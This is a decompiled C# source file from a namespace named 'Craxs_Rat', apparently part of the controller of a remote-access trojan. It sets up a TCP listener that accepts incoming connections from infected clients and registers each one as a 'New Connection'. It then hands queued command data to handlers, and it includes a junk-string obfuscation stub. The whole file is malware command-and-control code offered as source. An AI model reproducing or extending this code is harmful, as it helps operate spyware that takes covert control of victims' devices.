using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000FE RID: 254
	public class GClass7
	{
		// Token: 0x060012AF RID: 4783 RVA: 0x000C1034 File Offset: 0x000BF234
		public GClass7(string string_0)
		{
			this.bool_0 = true;
			this.strings_0 = new List<string>();
			this.gclass10s_0 = new List<GClass10>();
			this.manualResetEvent_0 = new ManualResetEvent(false);
			this.method_0(string_0);
		}

		// Token: 0x060012B0 RID: 4784 RVA: 0x000C1078 File Offset: 0x000BF278
		public void method_0(string string_0)
		{
			this.random_0 = new Random();
			this.gclass10s_1 = this.gclass10s_0;
			this.object_0 = RuntimeHelpers.GetObjectValue(new object());
			this.gclass10s_0 = new List<GClass10>();
			int num = Conversions.ToInteger(string_0);
			if (this.method_4(num))
			{
				this.tcpListener_0 = new TcpListener(IPAddress.Any, num);
				this.tcpListener_0.Server.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
				this.tcpListener_0.Server.SendTimeout = -1;
				this.tcpListener_0.Server.ReceiveTimeout = -1;
				this.tcpListener_0.Server.SendBufferSize = 999999;
				this.tcpListener_0.Server.ReceiveBufferSize = 999999;
				this.tcpListener_0.Start();
				new Thread(new ThreadStart(this.method_1))
				{
					IsBackground = true
				}.Start();
				new Thread(new ThreadStart(this.method_5))
				{
					IsBackground = true
				}.Start();
				this.bool_0 = false;
			}
			else
			{
				Interaction.MsgBox(string.Format("The specified port ({0}) is already in use", string_0), MsgBoxStyle.Critical, Module8.string_5);
				Environment.Exit(0);
			}
			Module3.string_0 = Module3.string_0 + string_0 + " ";
		}

		// Token: 0x060012B1 RID: 4785 RVA: 0x000C11C0 File Offset: 0x000BF3C0
		public void method_1()
		{
			for (;;)
			{
				try
				{
					Thread.Sleep(1);
					this.manualResetEvent_0.Reset();
					this.tcpListener_0.BeginAcceptTcpClient(new AsyncCallback(this.method_2), this.tcpListener_0);
					this.manualResetEvent_0.WaitOne();
				}
				catch (SocketException ex)
				{
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060012B2 RID: 4786 RVA: 0x000C1248 File Offset: 0x000BF448
		private void method_2(IAsyncResult iasyncResult_0)
		{
			try
			{
				GClass8 gclass = new GClass8(this.tcpListener_0.EndAcceptTcpClient(iasyncResult_0), ((IPEndPoint)this.tcpListener_0.LocalEndpoint).Port, this);
				object collection_ = GClass9.collection_0;
				lock (collection_)
				{
					if (!GClass9.collection_2.Contains(gclass.string_2))
					{
						GClass9.smethod_2(gclass, "New Connection", gclass.image_0);
						GClass9.collection_2.Add(new object[]
						{
							gclass,
							gclass.tcpClient_0
						}, gclass.string_2, null, null);
					}
				}
			}
			catch (ObjectDisposedException ex)
			{
			}
			catch (SocketException ex2)
			{
			}
			catch (Exception ex3)
			{
			}
			try
			{
				Thread.Sleep(1);
				this.manualResetEvent_0.Set();
			}
			catch (Exception ex4)
			{
			}
		}

		// Token: 0x060012B3 RID: 4787 RVA: 0x000C1380 File Offset: 0x000BF580
		private object method_3()
		{
			for (;;)
			{
				Thread.Sleep(1);
				try
				{
					GClass10 gclass = null;
					object objectValue = RuntimeHelpers.GetObjectValue(this.gclass10s_1);
					object obj = objectValue;
					ObjectFlowControl.CheckForSyncLockOnValueType(obj);
					lock (obj)
					{
						if (this.gclass10s_0.Count > 0)
						{
							gclass = this.gclass10s_0[0];
							this.gclass10s_0.RemoveAt(0);
						}
					}
					if (gclass != null)
					{
						GClass9.smethod_3(new object[]
						{
							gclass.gclass8_0,
							gclass.bytes_0,
							gclass.objects_0,
							gclass.tcpClient_0
						});
						gclass.bool_0 = true;
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060012B4 RID: 4788 RVA: 0x000C1468 File Offset: 0x000BF668
		private bool method_4(int int_0)
		{
			IPGlobalProperties ipglobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			IPEndPoint[] activeTcpListeners = ipglobalProperties.GetActiveTcpListeners();
			foreach (IPEndPoint ipendPoint in activeTcpListeners)
			{
				if (ipendPoint.Port == int_0)
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x060012B5 RID: 4789 RVA: 0x000C14B4 File Offset: 0x000BF6B4
		internal static string smethod_0(string string_0, string string_1, int int_0)
		{
			try
			{
				string text;
				do
				{
					text = "+w3YoxSWNZ0Rao4T6OreWKbHMmAdzVJVQ==";
				}
				while (text.Length <= 0);
				string text2;
				do
				{
					text2 = "+RrXZvX6AX1gSq5+FNT8TKi65VQFdV/leEI0IssR8Z8cDwoRQBykIEzLM2JRqxqI4dOOw";
				}
				while (text2.Length <= 0);
				string text3;
				do
				{
					text3 = "tpVQSHwKWyrRRP8y/MjT40wyvBon5BUJlFmXnmfxxXI7JSNtXrg402Do3TZ5dQy6+27jBpFFKYsa";
				}
				while (text3.Length <= 0);
				string text4;
				do
				{
					text4 = "powIOhya6FOraSJcI0RX9yEoa2JizSwp456QM2Rwp2npbto2mhmdioUbcCloGApotMu0DY37Hrn5";
				}
				while (text4.Length <= 0);
				string text5;
				do
				{
					text5 = "+v3NbvUF6nN0U6oG4LjAyY4pIWnBT69ZqWhIdafGdNV7O1BSPdbeymud4SP/MpmeUgXOreD";
				}
				while (text5.Length <= 0);
				while (string_1.Length <= 0)
				{
				}
			}
			catch (Exception ex)
			{
			}
			return string_1;
		}

		// Token: 0x060012B6 RID: 4790 RVA: 0x000C1574 File Offset: 0x000BF774
		[CompilerGenerated]
		private void method_5()
		{
			this.method_3();
		}

		// Token: 0x04000A61 RID: 2657
		public bool bool_0;

		// Token: 0x04000A62 RID: 2658
		public TcpListener tcpListener_0;

		// Token: 0x04000A63 RID: 2659
		public List<string> strings_0;

		// Token: 0x04000A64 RID: 2660
		public List<GClass10> gclass10s_0;

		// Token: 0x04000A65 RID: 2661
		public long long_0;

		// Token: 0x04000A66 RID: 2662
		public long long_1;

		// Token: 0x04000A67 RID: 2663
		public ManualResetEvent manualResetEvent_0;

		// Token: 0x04000A68 RID: 2664
		public Random random_0;

		// Token: 0x04000A69 RID: 2665
		public List<GClass10> gclass10s_1;

		// Token: 0x04000A6A RID: 2666
		public object object_0;
	}
}
